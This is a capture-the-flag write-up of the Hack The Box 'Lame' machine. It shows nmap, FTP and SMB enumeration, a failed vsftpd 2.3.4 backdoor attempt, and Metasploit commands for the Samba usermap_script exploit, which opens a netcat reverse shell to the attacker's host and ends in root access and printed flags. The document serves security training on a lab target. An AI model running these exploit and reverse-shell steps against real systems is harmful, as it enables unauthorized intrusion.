# 🧠 HTB Lame — Rooted with Exploits

Hey if you’re reading this. Today I completed the Lame hack the box machine. I hope this writeup serves as a guide and my thought process.

---

## 🔍 Nmap Scan Results

I began by scanning the target machine (10.10.10.3) to identify open ports and services:

```bash
┌──(futaba㉿FutabaLab)-[~/Downloads/htb/Lame]
└─$ nmap -A -sV --top-ports 1000 10.10.10.3
```

**Nmap Output:**

```
PORT    STATE SERVICE VERSION
21/tcp  open  ftp     vsftpd 2.3.4
22/tcp  open  ssh     OpenSSH 4.7p1 Debian 8ubuntu1 (protocol 2.0)
139/tcp open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp open  netbios-ssn Samba smbd 3.0.20-Debian (workgroup: WORKGROUP)
```

Notably, FTP (port 21) allows anonymous login, and Samba (ports 139 and 445) is running version 3.0.20-Debian.

---

## 📂 Anonymous FTP Access

I attempted to connect to the FTP service:

```bash
┌──(futaba㉿FutabaLab)-[~/Downloads/htb/Lame]
└─$ ftp 10.10.10.3
Connected to 10.10.10.3.
220 (vsFTPd 2.3.4)
Name (10.10.10.3:futaba): Anonymous
331 Please specify the password.
Password:
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
229 Entering Extended Passive Mode (|||52422|).
150 Here comes the directory listing.
226 Directory send OK.
ftp>
```

However, the directory listing was empty, which seemed suspicious. I decided to investigate further.

---

## 🐍 Exploiting vsFTPd 2.3.4 Backdoor (CVE-2011-2523)

The version of vsFTPd running (2.3.4) is known to have a backdoor that can be exploited. I used Metasploit to attempt an exploit:

```bash
msf6 exploit(unix/ftp/vsftpd_234_backdoor) > use exploit/unix/ftp/vsftpd_234_backdoor
[*] Using configured payload cmd/unix/interact
msf6 exploit(unix/ftp/vsftpd_234_backdoor) > set RHOSTS 10.10.10.3
RHOSTS => 10.10.10.3
msf6 exploit(unix/ftp/vsftpd_234_backdoor) > set payload cmd/unix/interact
payload => cmd/unix/interact
msf6 exploit(unix/ftp/vsftpd_234_backdoor) > run
[*] 10.10.10.3:21 - Banner: 220 (vsFTPd 2.3.4)
[*] 10.10.10.3:21 - USER: 331 Please specify the password.
[*] Exploit completed, but no session was created.
```

Unfortunately, this attempt did not create a session :( I decided to explore other things.

---

## 🖥️ Enumerating Samba Shares

Next, I enumerated the Samba shares:

```bash
┌──(futaba㉿FutabaLab)-[~/Downloads/htb/Lame]
└─$ smbclient -L //10.10.10.3 -N
Anonymous login successful

    	Sharename   	Type  	Comment
    	---------   	----  	-------
    	print$      	Disk  	Printer Drivers
    	tmp         	Disk  	oh noes!
    	opt         	Disk
    	IPC$        	IPC   	IPC Service (lame server (Samba 3.0.20-Debian))
    	ADMIN$      	IPC   	IPC Service (lame server (Samba 3.0.20-Debian))
```

The `tmp` share had the comment "oh noes!" and seemed worth investigating.

---

## 🗂️ Accessing the tmp Share

I connected to the `tmp` share:

```bash
┌──(futaba㉿FutabaLab)-[~/Downloads/htb/Lame]
└─$ smbclient //10.10.10.3/tmp -N
Anonymous login successful
Try "help" to get a list of possible commands.
smb: \> ls
  .                               	D    	0  Sat May  3 13:14:49 2025
  ..                             	DR    	0  Sat Oct 31 17:33:58 2020
  .ICE-unix                      	DH    	0  Sat May  3 04:01:29 2025
  vmware-root                    	DR    	0  Sat May  3 04:03:03 2025
  .X11-unix                      	DH    	0  Sat May  3 04:01:53 2025
  .X0-lock                       	HR   	11  Sat May  3 04:01:53 2025
  5541.jsvc_up                    	R    	0  Sat May  3 04:02:28 2025
  hago                            	N    	0  Sat May  3 08:20:41 2025
  vgauthsvclog.txt.0              	R 	1600  Sat May  3 04:01:27 2025
```

I downloaded the files `5541.jsvc_up`, `hago`, and `vgauthsvclog.txt.0` for further analysis.

---

## 📄 Analyzing vgauthsvclog.txt.0

The `vgauthsvclog.txt.0` file contained logs from the VMware Guest Authentication Service. Here's what it had:

```
[May 02 14:01:27.299] [ message] [VGAuthService] VGAuthService 'build-4448496' logging at level 'normal'
[May 02 14:01:27.299] [ message] [VGAuthService] Pref_LogAllEntries: 1 preference groups in file '/etc/vmware-tools/vgauth.conf'
[May 02 14:01:27.299] [ message] [VGAuthService] Group 'service'
[May 02 14:01:27.299] [ message] [VGAuthService]  	samlSchemaDir=/usr/lib/vmware-vgauth/schemas
[May 02 14:01:27.299] [ message] [VGAuthService] Pref_Log 
```
Uhhh nothing too interesting!

---

## 🚪 Exploiting Samba 3.0.20 — usermap\_script RCE

Since access to the `opt` share was denied and we still had zero credentials, I turned my attention to the vulnerable Samba version: `3.0.20-Debian`. From a `searchsploit` command, we can find an interesting exploit:

> **Samba 3.0.20 < 3.0.25rc3 - 'Username' map script' Command Execution (Metasploit)**

Perfect.

I fired up Metasploit and configured the `usermap_script` exploit:

```bash
msf6 > use exploit/multi/samba/usermap_script
[*] No payload configured, defaulting to cmd/unix/reverse_netcat

msf6 exploit(multi/samba/usermap_script) > set RHOSTS (MACHINE IP HERE)
RHOSTS => (MACHINE IP HERE)

msf6 exploit(multi/samba/usermap_script) > set payload cmd/unix/reverse_netcat
payload => cmd/unix/reverse_netcat

msf6 exploit(multi/samba/usermap_script) > set LHOST (YOUR IP HERE)
LHOST => (YOUR IP HERE)

msf6 exploit(multi/samba/usermap_script) > set LPORT 4444
LPORT => 4444

msf6 exploit(multi/samba/usermap_script) > run
[*] Started reverse TCP handler on (YOUR IP HERE):4444
[*] Command shell session 1 opened!
```

🎯 **Boom — shell obtained.**

---

## 🧑‍💻 Privilege Escalation

I quickly upgraded the shell with:

```bash
python -c 'import pty; pty.spawn("/bin/bash")'
```

Now sitting in a proper shell as `root`, I checked for sudo permissions:

```bash
root@lame:/# sudo -l
User root may run the following commands on this host:
  (ALL) ALL
```

Yep, **we are root**.

---

## 🏁 Post Exploitation & Flags

I grabbed both the **user** and **root** flags:

```bash
root@lame:/# cat /home/makis/user.txt
61e8183ff3900a6f7e0fff9b283d34b7

root@lame:/# cat /root/root.txt
53e988932913b188adf01f1658ca6a8c
```

🏆 [Achievement Unlocked](https://www.hackthebox.com/achievement/machine/1519610/1)

---

## 🧠 Final Thoughts

This machine definitely lives up to its name... **Lame!**. It’s a very easy box with outdated services and known public exploits. The steps were:

1. Nmap scan for enumeration.
2. FTP anonymous access (didn't help much).
3. Failed `vsftpd` backdoor exploit.
4. Samba share enumeration.
5. Successful RCE via `user_map_script` exploit on Samba.

The hardest part was... well, making this writeup hahaha. 😅

---

## 🎓 Lessons Learned

* Always check software versions — CVEs are your best friend.
* Enumerate **everything**, even if it looks empty.
* Not all exploits result in a shell — but don't give up too fast!
* Samba is often an easy win in CTF-style boxes when it's this outdated.

---

Thanks for reading! 🎉
